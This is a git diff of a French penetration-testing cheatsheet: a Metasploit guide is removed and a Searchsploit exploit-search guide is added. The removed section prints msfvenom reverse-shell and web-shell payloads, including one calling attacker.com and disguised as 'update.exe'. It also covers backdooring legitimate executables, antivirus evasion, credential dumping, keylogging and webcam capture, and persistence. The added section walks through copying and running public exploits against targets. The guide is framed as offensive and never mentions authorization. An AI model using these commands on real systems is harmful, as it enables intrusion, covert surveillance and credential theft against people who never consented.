@@ -1,971 +1,756 @@
-# 💥 Metasploit Framework - Cheatsheet Cyber Sécurité
+# 🔎 Searchsploit - Cheatsheet Cyber Sécurité
 
-Guide orienté **exploitation de vulnérabilités** et **post-exploitation** avec Metasploit Framework. Focus sur l'utilisation offensive et le pwn.
-
----
-
-## 📖 Qu'est-ce que Metasploit ?
-
-**Metasploit Framework** est le framework d'exploitation le plus puissant permettant de :
-- Exploiter des vulnérabilités connues
-- Générer des payloads
-- Post-exploitation et persistence
-- Pivoting et lateral movement
-- Évasion d'antivirus
-- Social engineering
-
-**Base de données** : 2,300+ exploits, 600+ payloads, 1,100+ auxiliaires
+Guide orienté **recherche d'exploits** et **exploitation de vulnérabilités** avec searchsploit. Focus sur la découverte rapide et l'utilisation d'exploits.
 
 ---
 
-## 1️⃣ Démarrage et Navigation
+## 📖 Qu'est-ce que Searchsploit ?
 
-### Lancer Metasploit
+**Searchsploit** est un outil en ligne de commande pour rechercher des exploits dans la base de données **Exploit-DB** (exploit-database).
+
+**Base de données** : 40,000+ exploits et PoC
+
+**Avantages** :
+- Offline (pas besoin d'internet)
+- Rapide
+- Intégré dans Kali Linux
+- Compatible avec Metasploit
+
+---
+
+## 1️⃣ Recherche Basique
+
+### Recherche simple
 
 ```bash
-# Console Metasploit
-msfconsole
+# Recherche par mot-clé
+searchsploit apache
 
-# Quiet mode (sans banner)
-msfconsole -q
+# Recherche multiple mots-clés
+searchsploit apache 2.4
 
-# Charger un resource script
-msfconsole -r script.rc
+# Recherche exacte
+searchsploit "apache 2.4.49"
 
-# Avec base de données
-msfdb init
-msfconsole
+# Recherche par version
+searchsploit wordpress 5.8
 ```
 
-### Commandes de base
+### Recherche par service
 
 ```bash
-# Aide
-help
-help search
-help set
+# Services communs
+searchsploit ssh
+searchsploit ftp
+searchsploit mysql
+searchsploit smb
+searchsploit rdp
+searchsploit telnet
+searchsploit smtp
+```
 
-# Version
-version
+### Recherche par plateforme
 
-# Quitter
-exit
-quit
+```bash
+# Par OS
+searchsploit windows
+searchsploit linux
+searchsploit macos
+searchsploit android
 
-# Nettoyer l'écran
-clear
-
-# Historique
-history
-
-# Banner aléatoire
-banner
+# Par architecture
+searchsploit x86
+searchsploit x64
+searchsploit arm
 ```
 
 ---
 
-## 2️⃣ Recherche d'Exploits
+## 2️⃣ Filtrage et Options
 
-### Recherche basique
+### Filtres de titre
 
 ```bash
-# Par service
-msf6 > search apache
-msf6 > search ssh
-msf6 > search smb
+# Case insensitive (défaut)
+searchsploit Apache
+
+# Case sensitive
+searchsploit -c Apache
+
+# Titre exact
+searchsploit -t "Apache 2.4.49"
+
+# Exclure des termes
+searchsploit apache --exclude=2.2
+```
+
+### Filtres par type
+
+```bash
+# Remote exploits seulement
+searchsploit apache --remote
+
+# Local exploits seulement
+searchsploit windows --local
+
+# Web exploits
+searchsploit wordpress --webapp
+
+# DOS exploits
+searchsploit apache --dos
+```
+
+### Filtres avancés
+
+```bash
+# Par année
+searchsploit apache --year 2021
 
 # Par CVE
-msf6 > search cve:2021-41773
-msf6 > search cve:2017-0144
-
-# Par nom
-msf6 > search eternalblue
-msf6 > search shellshock
-msf6 > search log4shell
-```
-
-### Recherche avancée
-
-```bash
-# Par plateforme
-msf6 > search platform:windows
-msf6 > search platform:linux
-msf6 > search platform:unix
-
-# Par type
-msf6 > search type:exploit
-msf6 > search type:auxiliary
-msf6 > search type:post
-
-# Par rank
-msf6 > search rank:excellent
-msf6 > search rank:great
-
-# Par date
-msf6 > search date:2021
-msf6 > search date:2023
+searchsploit CVE-2021-41773
 
 # Par auteur
-msf6 > search author:metasploit
-```
+searchsploit --author "Metasploit"
 
-### Filtres combinés
-
-```bash
-# Multiple critères
-msf6 > search apache type:exploit platform:linux
-
-# Exclure
-msf6 > search windows -s date
-
-# Avec rank minimum
-msf6 > search smb rank:excellent
-
-# Remote exploits seulement
-msf6 > search type:exploit platform:windows rank:excellent
+# Exclure CVE
+searchsploit apache --exclude-cve
 ```
 
 ---
 
-## 3️⃣ Utilisation d'un Exploit
+## 3️⃣ Affichage des Résultats
 
-### Charger et configurer
+### Formats de sortie
 
 ```bash
-# Utiliser un module
-msf6 > use exploit/multi/http/apache_normalize_path_rce
+# Affichage standard
+searchsploit apache
 
-# Informations sur le module
-msf6 exploit(apache_rce) > info
+# Avec chemin complet
+searchsploit apache -p
 
-# Options disponibles
-msf6 exploit(apache_rce) > show options
+# Affichage détaillé
+searchsploit apache -v
 
-# Options avancées
-msf6 exploit(apache_rce) > show advanced
+# JSON output
+searchsploit apache --json
 
-# Payloads compatibles
-msf6 exploit(apache_rce) > show payloads
+# XML output
+searchsploit apache --xml
 
-# Targets disponibles
-msf6 exploit(apache_rce) > show targets
+# Overflow (affichage complet sans troncature)
+searchsploit apache --overflow
 ```
 
-### Configuration des options
+### Couleurs et présentation
 
 ```bash
-# Définir RHOSTS (target)
-msf6 exploit(apache_rce) > set RHOSTS 192.168.1.100
+# Sans couleur
+searchsploit apache --colour
 
-# Définir RPORT
-msf6 exploit(apache_rce) > set RPORT 80
-
-# Définir LHOST (attacker IP)
-msf6 exploit(apache_rce) > set LHOST 192.168.1.50
-
-# Définir LPORT
-msf6 exploit(apache_rce) > set LPORT 4444
-
-# Voir configuration actuelle
-msf6 exploit(apache_rce) > options
-```
-
-### Exploitation
-
-```bash
-# Vérifier si vulnérable (si disponible)
-msf6 exploit(apache_rce) > check
-
-# Exploiter
-msf6 exploit(apache_rce) > exploit
-
-# Ou run
-msf6 exploit(apache_rce) > run
-
-# Exploiter en background
-msf6 exploit(apache_rce) > exploit -j
-
-# Exploiter avec payload spécifique
-msf6 exploit(apache_rce) > set payload windows/meterpreter/reverse_tcp
-msf6 exploit(apache_rce) > exploit
+# Strict mode (recherche stricte)
+searchsploit apache --strict
 ```
 
 ---
 
-## 4️⃣ Payloads
+## 4️⃣ Examiner et Copier des Exploits
 
-### Types de payloads
+### Examiner le code
 
-**Staged** (multi-étapes)
 ```bash
-# Windows
-windows/meterpreter/reverse_tcp      # Meterpreter staged
-windows/shell/reverse_tcp            # Shell standard staged
+# Examiner un exploit
+searchsploit -x 50383
 
-# Linux
-linux/x86/meterpreter/reverse_tcp
-linux/x64/meterpreter/reverse_tcp
+# Examiner par chemin
+searchsploit -x exploits/linux/remote/50383.py
 
-# Avantage : Petit fichier initial, fonctionnalités chargées après
+# Examiner avec less
+searchsploit -x 50383 | less
+
+# Examiner avec cat
+cat $(searchsploit -p 50383 | awk '{print $NF}')
 ```
 
-**Stageless** (single-stage)
-```bash
-# Windows
-windows/meterpreter_reverse_tcp      # Meterpreter stageless
-windows/shell_reverse_tcp            # Shell stageless
-
-# Linux
-linux/x86/meterpreter_reverse_tcp
-linux/x64/shell_reverse_tcp
-
-# Avantage : Tout en un seul fichier, évite détection staged
-```
-
-### Payloads populaires
+### Copier des exploits
 
 ```bash
-# Reverse shells
-windows/meterpreter/reverse_tcp      # Le plus utilisé
-linux/x64/meterpreter/reverse_tcp
-python/meterpreter/reverse_tcp
-php/meterpreter/reverse_tcp
-java/meterpreter/reverse_tcp
+# Copier dans répertoire actuel
+searchsploit -m 50383
 
-# Bind shells
-windows/meterpreter/bind_tcp
-linux/x64/shell/bind_tcp
+# Copier plusieurs exploits
+searchsploit -m 50383 50384 50385
 
-# Reverse HTTPS (évasion)
-windows/meterpreter/reverse_https
-linux/x64/meterpreter/reverse_https
-
-# Reverse DNS (évasion ultime)
-windows/meterpreter/reverse_dns
+# Copier avec chemin complet
+cp $(searchsploit -p 50383 | awk '{print $NF}') .
 ```
 
 ---
 
-## 5️⃣ Meterpreter
+## 5️⃣ Recherche par Service et Version
 
-### Commandes système
+### À partir d'un scan Nmap
 
 ```bash
-# Informations système
-meterpreter > sysinfo
-meterpreter > getuid
-meterpreter > getpid
+# Nmap scan
+nmap -sV target.com -oX scan.xml
 
-# Processus
-meterpreter > ps
-meterpreter > getpid
-meterpreter > migrate PID
-
-# Exécuter commandes
-meterpreter > execute -f cmd.exe -i
-meterpreter > shell              # Shell interactif
+# Recherche automatique depuis XML
+searchsploit --nmap scan.xml
 ```
 
-### Navigation fichiers
+### Recherche ciblée
 
 ```bash
-# Système de fichiers
-meterpreter > pwd
-meterpreter > cd C:\\Users\\Admin
-meterpreter > ls
-meterpreter > cat file.txt
-meterpreter > search -f *.txt
+# Apache
+searchsploit apache 2.4.49
+searchsploit "apache httpd 2.4.49"
 
-# Download/Upload
-meterpreter > download C:\\secrets\\passwords.txt
-meterpreter > upload /root/tool.exe C:\\Windows\\Temp\\
+# OpenSSH
+searchsploit openssh 7.4
+searchsploit "openssh 7.4p1"
 
-# Permissions
-meterpreter > getwd             # Current directory
-meterpreter > rm file.txt
-meterpreter > mkdir test
-```
+# MySQL
+searchsploit mysql 5.7
+searchsploit "mysql 5.7.29"
 
-### Capture de credentials
+# SMB
+searchsploit samba 4.11
+searchsploit "samba 4.11.6"
 
-```bash
-# Hashdump (Windows)
-meterpreter > hashdump
-
-# Mimikatz (via Kiwi extension)
-meterpreter > load kiwi
-meterpreter > creds_all
-meterpreter > lsa_dump_sam
-meterpreter > kiwi_cmd sekurlsa::logonpasswords
-
-# Tokens
-meterpreter > use incognito
-meterpreter > list_tokens -u
-meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
-```
-
-### Screenshots et keylogging
-
-```bash
-# Screenshot
-meterpreter > screenshot
-
-# Webcam
-meterpreter > webcam_list
-meterpreter > webcam_snap
-
-# Keylogger
-meterpreter > keyscan_start
-meterpreter > keyscan_dump
-meterpreter > keyscan_stop
-
-# Micro
-meterpreter > record_mic
-```
-
-### Persistence
-
-```bash
-# Persistence simple
-meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.50
-
-# Via registry (Windows)
-meterpreter > run persistence -X -i 60 -r 192.168.1.50
-
-# Scheduled task
-meterpreter > run scheduleme
-meterpreter > run schtaskabuse
-
-# Service
-meterpreter > run metsvc
-```
-
-### Pivoting
-
-```bash
-# Ajouter route
-meterpreter > run autoroute -s 10.10.10.0/24
-
-# Port forwarding
-meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
-
-# Liste routes
-meterpreter > run autoroute -p
-
-# SOCKS proxy
-msf6 > use auxiliary/server/socks_proxy
-msf6 auxiliary(socks_proxy) > set SRVPORT 1080
-msf6 auxiliary(socks_proxy) > run -j
+# FTP
+searchsploit vsftpd 2.3.4
+searchsploit proftpd 1.3.5
 ```
 
 ---
 
-## 6️⃣ Modules Auxiliaires
+## 6️⃣ Recherche par CVE
 
-### Scanners
-
-```bash
-# Port scan
-msf6 > use auxiliary/scanner/portscan/tcp
-msf6 auxiliary(tcp) > set RHOSTS 192.168.1.0/24
-msf6 auxiliary(tcp) > set PORTS 21,22,23,80,443,445,3389
-msf6 auxiliary(tcp) > run
-
-# SMB version
-msf6 > use auxiliary/scanner/smb/smb_version
-msf6 auxiliary(smb_version) > set RHOSTS 192.168.1.0/24
-msf6 auxiliary(smb_version) > run
-
-# HTTP version
-msf6 > use auxiliary/scanner/http/http_version
-msf6 auxiliary(http_version) > set RHOSTS 192.168.1.0/24
-msf6 auxiliary(http_version) > run
-```
-
-### Brute force
+### CVE lookup
 
 ```bash
-# SSH brute force
-msf6 > use auxiliary/scanner/ssh/ssh_login
-msf6 auxiliary(ssh_login) > set RHOSTS 192.168.1.100
-msf6 auxiliary(ssh_login) > set USER_FILE users.txt
-msf6 auxiliary(ssh_login) > set PASS_FILE passwords.txt
-msf6 auxiliary(ssh_login) > run
+# Recherche par CVE
+searchsploit CVE-2021-41773
 
-# FTP brute force
-msf6 > use auxiliary/scanner/ftp/ftp_login
+# CVE récents (2023)
+searchsploit CVE-2023
 
-# SMB brute force
-msf6 > use auxiliary/scanner/smb/smb_login
+# CVE anciens
+searchsploit CVE-2014
 
-# MySQL brute force
-msf6 > use auxiliary/scanner/mysql/mysql_login
-
-# PostgreSQL
-msf6 > use auxiliary/scanner/postgres/postgres_login
+# Multiple CVEs
+searchsploit CVE-2021-41773 CVE-2021-42013
 ```
 
-### Exploitation SMB
+### CVE populaires
 
 ```bash
 # EternalBlue (MS17-010)
-msf6 > use exploit/windows/smb/ms17_010_eternalblue
-msf6 exploit(ms17_010) > set RHOSTS 192.168.1.100
-msf6 exploit(ms17_010) > set payload windows/x64/meterpreter/reverse_tcp
-msf6 exploit(ms17_010) > set LHOST 192.168.1.50
-msf6 exploit(ms17_010) > exploit
-
-# SMBGhost (CVE-2020-0796)
-msf6 > use exploit/windows/smb/cve_2020_0796_smbghost
-
-# MS08-067
-msf6 > use exploit/windows/smb/ms08_067_netapi
-```
-
----
-
-## 7️⃣ Post-Exploitation
-
-### Modules post-exploitation
-
-```bash
-# Énumération Windows
-meterpreter > run post/windows/gather/enum_applications
-meterpreter > run post/windows/gather/enum_shares
-meterpreter > run post/windows/gather/credentials/windows_autologin
-meterpreter > run post/windows/gather/checkvm
-
-# Énumération Linux
-meterpreter > run post/linux/gather/enum_configs
-meterpreter > run post/linux/gather/enum_network
-meterpreter > run post/linux/gather/checkvm
-
-# Privilege escalation suggester
-meterpreter > run post/multi/recon/local_exploit_suggester
-```
-
-### Privilege Escalation
-
-```bash
-# Windows
-meterpreter > getsystem
-
-# Bypass UAC
-meterpreter > run post/windows/escalate/bypassuac
-meterpreter > run exploit/windows/local/bypassuac_injection
-
-# Linux
-meterpreter > run post/multi/recon/local_exploit_suggester
-# Puis utiliser l'exploit suggéré
-```
-
-### Lateral Movement
-
-```bash
-# PSExec
-msf6 > use exploit/windows/smb/psexec
-msf6 exploit(psexec) > set RHOSTS 10.10.10.5
-msf6 exploit(psexec) > set SMBUser Administrator
-msf6 exploit(psexec) > set SMBPass password123
-msf6 exploit(psexec) > exploit
-
-# WMI
-msf6 > use exploit/windows/local/wmi
-
-# Pass the Hash
-msf6 > use exploit/windows/smb/psexec
-msf6 exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
-```
-
----
-
-## 8️⃣ Génération de Payloads (msfvenom)
-
-### Reverse shells
-
-```bash
-# Windows EXE
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe
-
-# Windows DLL
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll > shell.dll
-
-# Linux ELF
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell.elf
-
-# macOS Mach-O
-msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho > shell.macho
-
-# Android APK
-msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk
-```
-
-### Web shells
-
-```bash
-# PHP
-msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php
-
-# ASP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp > shell.asp
-
-# ASPX
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx > shell.aspx
-
-# JSP
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.jsp
-
-# WAR (Tomcat)
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war > shell.war
-```
-
-### Payloads encodés (évasion AV)
-
-```bash
-# Shikata_ga_nai (encoder populaire)
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded.exe
-
-# Multiple encoders
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -e x86/call4_dword_xor -i 5 -f exe > double_encoded.exe
-
-# Liste des encoders
-msfvenom -l encoders
-```
-
-### Templates et injection
-
-```bash
-# Injecter dans EXE légitime
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x /path/to/legit.exe -f exe > backdoored.exe
-
-# Garder template fonctionnel
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x putty.exe -k -f exe > backdoored_putty.exe
-```
-
----
-
-## 9️⃣ Handler (Listener)
-
-### Configuration handler
-
-```bash
-# Multi/handler universel
-msf6 > use exploit/multi/handler
-msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp
-msf6 exploit(handler) > set LHOST 192.168.1.50
-msf6 exploit(handler) > set LPORT 4444
-msf6 exploit(handler) > exploit -j
-
-# Handler automatique (resource script)
-echo "use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.1.50
-set LPORT 4444
-exploit -j" > handler.rc
-
-msfconsole -r handler.rc
-```
-
-### Gestion des sessions
-
-```bash
-# Lister les sessions
-msf6 > sessions
-
-# Interagir avec session
-msf6 > sessions -i 1
-
-# Tuer une session
-msf6 > sessions -k 1
-
-# Tuer toutes les sessions
-msf6 > sessions -K
-
-# Background session
-meterpreter > background
-# Ou Ctrl+Z
-
-# Upgrader shell vers Meterpreter
-msf6 > sessions -u 1
-```
-
----
-
-## 🔟 Base de Données et Workspaces
-
-### Workspaces
-
-```bash
-# Lister workspaces
-msf6 > workspace
-
-# Créer workspace
-msf6 > workspace -a pentest_client1
-
-# Changer workspace
-msf6 > workspace pentest_client1
-
-# Supprimer workspace
-msf6 > workspace -d old_test
-
-# Renommer
-msf6 > workspace -r old new
-```
-
-### Base de données
-
-```bash
-# Status de la DB
-msf6 > db_status
-
-# Importer scan Nmap
-msf6 > db_import scan.xml
-
-# Voir les hôtes
-msf6 > hosts
-
-# Voir les services
-msf6 > services
-
-# Voir les vulnérabilités
-msf6 > vulns
-
-# Voir les credentials
-msf6 > creds
-
-# Loot (données récupérées)
-msf6 > loot
-
-# Notes
-msf6 > notes
-```
-
----
-
-## 1️⃣1️⃣ Exploits Populaires
-
-### Windows
-
-```bash
-# EternalBlue (MS17-010)
-use exploit/windows/smb/ms17_010_eternalblue
-
-# BlueKeep (CVE-2019-0708)
-use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
-
-# PrintNightmare (CVE-2021-34527)
-use exploit/windows/dcerpc/cve_2021_1675_printnightmare
-
-# Zerologon (CVE-2020-1472)
-use exploit/windows/smb/cve_2020_1472_zerologon
-
-# MS08-067
-use exploit/windows/smb/ms08_067_netapi
-```
-
-### Linux
-
-```bash
-# Shellshock
-use exploit/multi/http/apache_mod_cgi_bash_env_exec
-
-# Dirty COW
-use exploit/linux/local/cve_2016_5195_dirtycow
-
-# Sudo Baron Samedit
-use exploit/linux/local/sudo_baron_samedit
-
-# PwnKit
-use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
-```
-
-### Web
-
-```bash
-# Apache 2.4.49 Path Traversal
-use exploit/multi/http/apache_normalize_path_rce
+searchsploit CVE-2017-0144
+searchsploit ms17-010
 
 # Log4Shell
-use exploit/multi/http/log4shell_header_injection
+searchsploit CVE-2021-44228
+searchsploit log4j
 
-# Struts2
-use exploit/multi/http/struts2_content_type_ognl
+# Shellshock
+searchsploit CVE-2014-6271
+searchsploit shellshock
+
+# Heartbleed
+searchsploit CVE-2014-0160
+searchsploit heartbleed
+
+# BlueKeep
+searchsploit CVE-2019-0708
+searchsploit bluekeep
+```
+
+---
+
+## 7️⃣ Workflows d'Exploitation
+
+### Workflow type 1 : Depuis Nmap
+
+```bash
+# 1. Scan Nmap avec versions
+nmap -sV -p- target.com -oX nmap_scan.xml
+
+# 2. Recherche automatique
+searchsploit --nmap nmap_scan.xml
+
+# 3. Examiner les exploits intéressants
+searchsploit -x 50383
+
+# 4. Copier l'exploit
+searchsploit -m 50383
+
+# 5. Adapter et exécuter
+python 50383.py target.com 80
+```
+
+### Workflow type 2 : Depuis service connu
+
+```bash
+# 1. Identifier service et version
+# Exemple : Apache 2.4.49
+
+# 2. Recherche
+searchsploit "apache 2.4.49"
+
+# 3. Filtrer par remote
+searchsploit "apache 2.4.49" --remote
+
+# 4. Examiner
+searchsploit -x 50383
+
+# 5. Vérifier le CVE
+searchsploit CVE-2021-41773
+
+# 6. Copier et exploiter
+searchsploit -m 50383
+python 50383.py http://target.com
+```
+
+### Workflow type 3 : Depuis CVE
+
+```bash
+# 1. CVE identifié (depuis advisory, news, etc.)
+# Exemple : CVE-2021-44228 (Log4Shell)
+
+# 2. Recherche
+searchsploit CVE-2021-44228
+
+# 3. Examiner tous les exploits
+searchsploit -x 50592
+
+# 4. Choisir le bon exploit (remote, local, dos)
+searchsploit CVE-2021-44228 --remote
+
+# 5. Copier
+searchsploit -m 50592
+
+# 6. Lire les instructions
+cat 50592.py
+```
+
+---
+
+## 8️⃣ Recherche par Application Web
+
+### CMS populaires
+
+```bash
+# WordPress
+searchsploit wordpress
+searchsploit "wordpress plugin"
+searchsploit wordpress 5.8
+
+# Joomla
+searchsploit joomla
+searchsploit "joomla 3.9"
+
+# Drupal
+searchsploit drupal
+searchsploit drupal 7.x
+
+# Magento
+searchsploit magento
+
+# PrestaShop
+searchsploit prestashop
+```
+
+### Applications web communes
+
+```bash
+# phpMyAdmin
+searchsploit phpmyadmin
 
 # Tomcat
-use exploit/multi/http/tomcat_mgr_upload
+searchsploit tomcat
+searchsploit "apache tomcat 9.0"
 
 # Jenkins
-use exploit/linux/http/jenkins_script_console
+searchsploit jenkins
+
+# Struts
+searchsploit struts
+searchsploit "apache struts"
+
+# WebLogic
+searchsploit weblogic
 ```
 
 ---
 
-## 1️⃣2️⃣ Social Engineering
+## 9️⃣ Mise à Jour de la Base
 
-### Phishing avec SET
+### Update
 
 ```bash
-# Lancer SET depuis Metasploit
-msf6 > use auxiliary/server/browser_autopwn2
+# Mettre à jour la base de données
+searchsploit -u
 
-# Ou utiliser SET directement
-setoolkit
+# Update avec git
+cd /usr/share/exploitdb
+git pull
 
-# Ou créer payload et setup listener
-msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe > update.exe
-
-msf6 > use exploit/multi/handler
-msf6 exploit(handler) > set payload windows/meterpreter/reverse_https
-msf6 exploit(handler) > set LHOST 0.0.0.0
-msf6 exploit(handler) > set LPORT 443
-msf6 exploit(handler) > exploit -j
+# Vérifier la version
+searchsploit -v
 ```
 
-### Malicious Office Macros
+### Statistiques
 
 ```bash
-# Générer macro
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba
+# Nombre total d'exploits
+searchsploit -h | grep "exploits"
 
-# Ou utiliser module
-msf6 > use exploit/multi/fileformat/office_word_macro
-msf6 exploit(office_macro) > set payload windows/meterpreter/reverse_tcp
-msf6 exploit(office_macro) > set LHOST 192.168.1.50
-msf6 exploit(office_macro) > exploit
+# Compter par plateforme
+ls /usr/share/exploitdb/exploits/ | wc -l
+
+# Derniers exploits ajoutés
+ls -lt /usr/share/exploitdb/exploits/ | head -20
 ```
 
 ---
 
-## 1️⃣3️⃣ Évasion d'Antivirus
+## 🔟 Intégration avec Metasploit
 
-### Techniques d'évasion
+### Trouver module Metasploit
 
 ```bash
-# Encodage multiple
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded.exe
+# Recherche avec indication Metasploit
+searchsploit apache --metasploit
 
-# Template injection
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x putty.exe -k -f exe > backdoored.exe
-
-# Custom template
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x custom_app.exe -k -f exe > malicious.exe
-
-# Payload en mémoire (Powershell)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh-reflection
-
-# HTTPS pour chiffrement
-msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe > https_shell.exe
+# Ou chercher "(Metasploit)" dans résultats
+searchsploit apache | grep Metasploit
 ```
 
-### Veil-Evasion
+### Conversion vers Metasploit
 
 ```bash
-# Générer payload avec Veil
-veil
+# 1. Trouver l'exploit
+searchsploit apache 2.4.49
 
-# Puis setup handler Metasploit
-msf6 > use exploit/multi/handler
-msf6 exploit(handler) > set payload windows/meterpreter/reverse_https
-msf6 exploit(handler) > exploit
-```
+# 2. Noter le EDB-ID
+# Exploit: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
+# EDB-ID: 50383
 
----
+# 3. Chercher dans Metasploit
+msfconsole
+msf6 > search 50383
+msf6 > search apache 2.4.49
 
-## 1️⃣4️⃣ Resource Scripts
-
-### Créer un script
-
-```bash
-# handler.rc
-cat > handler.rc << EOF
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.1.50
-set LPORT 4444
-set ExitOnSession false
-exploit -j -z
-EOF
-
-# Exécuter
-msfconsole -r handler.rc
-```
-
-### Scripts utiles
-
-**Scan automatique**
-```bash
-# autoscan.rc
-workspace -a target_scan
-db_nmap -sV -sC target.com
-services
-vulns
-```
-
-**Multi-handler**
-```bash
-# multi_handler.rc
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 0.0.0.0
-set LPORT 4444
-set ExitOnSession false
-exploit -j -z
-```
-
-**Post-exploitation automatique**
-```bash
-# post_exploit.rc
-run post/windows/gather/enum_applications
-run post/windows/gather/hashdump
-run post/windows/gather/enum_shares
-screenshot
+# 4. Utiliser le module
+msf6 > use exploit/multi/http/apache_normalize_path_rce
 ```
 
 ---
 
-## 1️⃣5️⃣ Plugins Utiles
+## 1️⃣1️⃣ Exemples Pratiques
 
-### Charger plugins
+### Scénario 1 : Exploitation Apache
 
 ```bash
-# Lister plugins
-msf6 > ls /usr/share/metasploit-framework/plugins/
+# Service découvert
+nmap -sV target.com -p 80
+# 80/tcp open  http    Apache httpd 2.4.49
 
-# Charger plugin
-msf6 > load plugin_name
+# Recherche
+searchsploit "apache 2.4.49"
 
-# Plugins populaires
-msf6 > load nessus      # Intégration Nessus
-msf6 > load nexpose     # Intégration Nexpose
-msf6 > load auto_add_route  # Auto routing
-msf6 > load alias       # Alias commands
+# Résultat
+# Apache HTTP Server 2.4.49 - Path Traversal & RCE | exploits/multiple/webapps/50383.py
+
+# Examiner
+searchsploit -x 50383
+
+# Copier
+searchsploit -m 50383
+
+# Exploiter
+python 50383.py target.com:80 "cat /etc/passwd"
 ```
 
-### Plugins externes
+### Scénario 2 : Exploitation vsftpd
 
 ```bash
-# Installer plugins dans
-~/.msf4/plugins/
+# Service FTP backdooré
+nmap -sV target.com -p 21
+# 21/tcp open  ftp     vsftpd 2.3.4
 
-# Exemple : Pentest plugin
-git clone https://github.com/darkoperator/Metasploit-Plugins
-cp Metasploit-Plugins/pentest.rb ~/.msf4/plugins/
-msf6 > load pentest
+# Recherche
+searchsploit vsftpd 2.3.4
+
+# Résultat
+# vsftpd 2.3.4 - Backdoor Command Execution | exploits/unix/remote/17491.rb
+
+# C'est un module Metasploit
+msfconsole
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > set RHOSTS target.com
+msf6 > exploit
+```
+
+### Scénario 3 : WordPress Plugin
+
+```bash
+# Site WordPress identifié
+wpscan --url http://target.com --enumerate p
+
+# Plugin vulnérable trouvé : wp-file-manager 6.0
+
+# Recherche
+searchsploit "wp file manager"
+
+# Résultat
+# WordPress Plugin File Manager 6.0-6.9 - RCE | exploits/php/webapps/51224.py
+
+# Copier et exploiter
+searchsploit -m 51224
+python 51224.py http://target.com
 ```
 
 ---
 
-## 1️⃣6️⃣ Tips et Astuces
+## 1️⃣2️⃣ Recherches Avancées
 
-### Performance
+### Combinaisons complexes
 
 ```bash
-# Limiter threads
-set THREADS 10
+# Version spécifique + type
+searchsploit "apache 2.4" --remote
 
-# Timeout
-set ConnectTimeout 5
+# Multiple critères
+searchsploit windows 10 --local --exclude=dos
 
-# Verbose mode
-set VERBOSE true
+# Par language
+searchsploit apache python
+searchsploit windows perl
+searchsploit linux c
 
-# Debug
-set LogLevel 3
+# Par type de payload
+searchsploit reverse shell linux
+searchsploit bind shell windows
+searchsploit privilege escalation linux
 ```
 
-### Alias
+### Regex et patterns
 
 ```bash
-# Créer alias
-alias ll "ls -la"
-alias handler "use exploit/multi/handler"
+# Recherche avec wildcard
+searchsploit "apache 2.4.*"
 
-# Sauvegarder alias
-save
+# Versions multiples
+searchsploit "apache 2.4.4[0-9]"
+
+# Recherche flexible
+searchsploit apache | grep -i "2\.4\."
 ```
 
-### Global options
+---
+
+## 1️⃣3️⃣ Scripts d'Automatisation
+
+### Script de recherche automatique
 
 ```bash
-# Options globales (toute session)
-setg LHOST 192.168.1.50
-setg LPORT 4444
-setg payload windows/meterpreter/reverse_tcp
+#!/bin/bash
+# auto-searchsploit.sh
 
-# Voir global options
-getg
+TARGET=$1
+NMAP_FILE="nmap_scan.xml"
 
-# Unset global
-unsetg LHOST
+echo "[+] Scanning $TARGET with Nmap..."
+nmap -sV -p- $TARGET -oX $NMAP_FILE
+
+echo "[+] Searching exploits with searchsploit..."
+searchsploit --nmap $NMAP_FILE | tee searchsploit_results.txt
+
+echo "[+] Extracting interesting exploits..."
+grep -i "remote\|rce\|shell" searchsploit_results.txt > interesting_exploits.txt
+
+echo "[+] Done! Check interesting_exploits.txt"
+```
+
+### Script de copie massive
+
+```bash
+#!/bin/bash
+# copy-exploits.sh
+
+# Lire les EDB-IDs depuis un fichier
+while read edb_id; do
+    echo "[*] Copying exploit $edb_id"
+    searchsploit -m $edb_id
+done < edb_ids.txt
+
